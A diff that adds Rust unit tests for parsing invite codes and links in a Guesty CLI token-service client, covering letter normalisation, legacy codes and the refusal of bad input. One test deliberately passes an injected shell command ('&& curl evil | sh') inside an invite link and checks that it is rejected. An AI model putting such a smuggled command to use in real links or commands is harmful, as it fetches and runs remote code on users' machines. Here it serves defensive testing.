@@ -275,17 +275,143 @@ mod tests {
 
     #[test]
     fn invites() {
-        assert_eq!(invite_code("abcd-efgh-jklm").unwrap(), "ABCDEFGHJKLM");
+        // L reads as 1 (Crockford), as the Node CLI read it.
+        assert_eq!(invite_code("abcd-efgh-jklm").unwrap(), "ABCDEFGHJK1M");
         assert_eq!(invite_code("oil0-0000-0000").unwrap(), "011000000000");
         assert!(invite_code("ABCD").is_err());
         match parse_invite("https://svc.example/join/ABCD-EFGH-JKLM").unwrap() {
             Invite::Code { url, code } => {
                 assert_eq!(url, "https://svc.example");
-                assert_eq!(code, "ABCDEFGHJKLM");
+                assert_eq!(code, "ABCDEFGHJK1M");
             }
             _ => panic!(),
         }
         let settings = ServiceSettings { url: "https://svc.example".into(), key: format!("gts_{}", "A".repeat(43)) };
         assert_eq!(decode_invite(&encode_invite(&settings)).unwrap(), settings);
+    }
+}
+
+/// Ports of test/invite.test.mjs, which imported parseInvite, invitedLink and
+/// serviceUrl from dist/token-service.js.
+#[cfg(test)]
+mod invite_tests {
+    use super::*;
+    use crate::json::json;
+
+    fn code(value: &str) -> (String, String) {
+        match parse_invite(value).unwrap_or_else(|e| panic!("{value}: {}", e.message())) {
+            Invite::Code { url, code } => (url, code),
+            Invite::Key(s) => panic!("{value}: expected a code, got a key for {}", s.url),
+        }
+    }
+
+    fn key(value: &str) -> ServiceSettings {
+        match parse_invite(value).unwrap_or_else(|e| panic!("{}", e.message())) {
+            Invite::Key(s) => s,
+            Invite::Code { .. } => panic!("expected a key"),
+        }
+    }
+
+    fn refused(result: Result<impl std::fmt::Debug>, pattern: &str) {
+        match result {
+            Ok(v) => panic!("expected /{pattern}/, got {v:?}"),
+            Err(e) => assert!(e.message().contains(pattern), "expected /{pattern}/, got {}", e.message()),
+        }
+    }
+
+    fn legacy(url: &str, key: &str) -> String {
+        let body = json::compact(&json!({ "url": url, "key": key }));
+        format!("gti_{}", base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(body))
+    }
+
+    #[test]
+    fn a_code_alone_is_for_the_hosted_service_in_any_case_and_with_misread_letters() {
+        assert_eq!(code("abcd-efgh-jkmn"), (HOSTED_TOKEN_SERVICE_URL.to_string(), "ABCDEFGHJKMN".to_string()));
+        assert_eq!(code(" 0O1I L2Z3 4567\n"), (HOSTED_TOKEN_SERVICE_URL.to_string(), "001112Z34567".to_string()));
+    }
+
+    #[test]
+    fn a_link_carries_its_services_address() {
+        assert_eq!(
+            code("https://tokens.example.com/join/ABCD-EFGH-JKMN"),
+            ("https://tokens.example.com".into(), "ABCDEFGHJKMN".into())
+        );
+        assert_eq!(
+            code("https://example.com/tokens/join/abcd-efgh-jkmn/"),
+            ("https://example.com/tokens".into(), "ABCDEFGHJKMN".into())
+        );
+        assert_eq!(code("http://127.0.0.1:8787/join/ABCD-EFGH-JKMN").0, "http://127.0.0.1:8787");
+    }
+
+    #[test]
+    fn a_cli_1_4_code_still_carries_its_service_and_key() {
+        let k = format!("gts_{}", "a".repeat(43));
+        assert_eq!(
+            key(&legacy("https://tokens.example.com", &k)),
+            ServiceSettings { url: "https://tokens.example.com".into(), key: k }
+        );
+    }
+
+    #[test]
+    fn anything_else_is_refused_with_what_an_invite_looks_like() {
+        refused(parse_invite("ABCD-EFGH"), "Invite codes look like ABCD-EFGH-JKLM");
+        refused(parse_invite("ABCD-EFGH-JKMU"), "Invite codes look like");
+        refused(parse_invite("http://tokens.example.com/join/ABCD-EFGH-JKMN"), "must use https");
+        refused(parse_invite("https://tokens.example.com/listings/ABCD-EFGH-JKMN"), "isn't a Guesty CLI invite link");
+        refused(
+            parse_invite("https://tokens.example.com/join/ABCD-EFGH-JKMN?ref=mail"),
+            "isn't a Guesty CLI invite link",
+        );
+        refused(parse_invite("gti_bm90LWpzb24"), "not a Guesty CLI invite code");
+    }
+
+    #[test]
+    fn a_link_from_the_service_must_point_back_at_it_and_the_command_is_built_here() {
+        let pair = |a: String, b: &str| (a, b.to_string());
+        assert_eq!(
+            invited_link(HOSTED_TOKEN_SERVICE_URL, &json!(format!("{HOSTED_TOKEN_SERVICE_URL}/join/abcd-efgh-jkmn")))
+                .unwrap(),
+            pair(format!("{HOSTED_TOKEN_SERVICE_URL}/join/ABCD-EFGH-JKMN"), "guesty join ABCD-EFGH-JKMN")
+        );
+        assert_eq!(
+            invited_link("https://tokens.example.com", &json!("https://tokens.example.com/join/ABCD-EFGH-JKMN"))
+                .unwrap(),
+            pair(
+                "https://tokens.example.com/join/ABCD-EFGH-JKMN".into(),
+                "guesty join https://tokens.example.com/join/ABCD-EFGH-JKMN"
+            )
+        );
+        refused(
+            invited_link("https://tokens.example.com", &json!("https://evil.example/join/ABCD-EFGH-JKMN")),
+            "for a different service",
+        );
+        refused(
+            invited_link(
+                "https://tokens.example.com",
+                &json!("https://tokens.example.com/join/ABCD-EFGH-JKMN && curl evil | sh"),
+            ),
+            "invalid invite link",
+        );
+        refused(invited_link(HOSTED_TOKEN_SERVICE_URL, &json!("ABCD-EFGH-JKMN")), "invalid invite link");
+        refused(invited_link(HOSTED_TOKEN_SERVICE_URL, &json!(42)), "invalid invite link");
+    }
+
+    #[test]
+    fn the_hosted_services_former_address_is_read_as_its_staykit_address() {
+        assert_eq!(HOSTED_TOKEN_SERVICE_URL, "https://guesty-tokens.staykit.ai");
+        assert_eq!(
+            service_url("https://guesty-tokens.simplyvacationrentalmanagement.com/").unwrap(),
+            HOSTED_TOKEN_SERVICE_URL
+        );
+        assert_eq!(
+            code("https://guesty-tokens.simplyvacationrentalmanagement.com/join/ABCD-EFGH-JKMN"),
+            (HOSTED_TOKEN_SERVICE_URL.into(), "ABCDEFGHJKMN".into())
+        );
+        let k = format!("gts_{}", "a".repeat(43));
+        assert_eq!(
+            key(&legacy("https://guesty-tokens.simplyvacationrentalmanagement.com", &k)),
+            ServiceSettings { url: HOSTED_TOKEN_SERVICE_URL.into(), key: k }
+        );
+        assert_eq!(service_url("https://tokens.example.com/").unwrap(), "https://tokens.example.com");
     }
 }
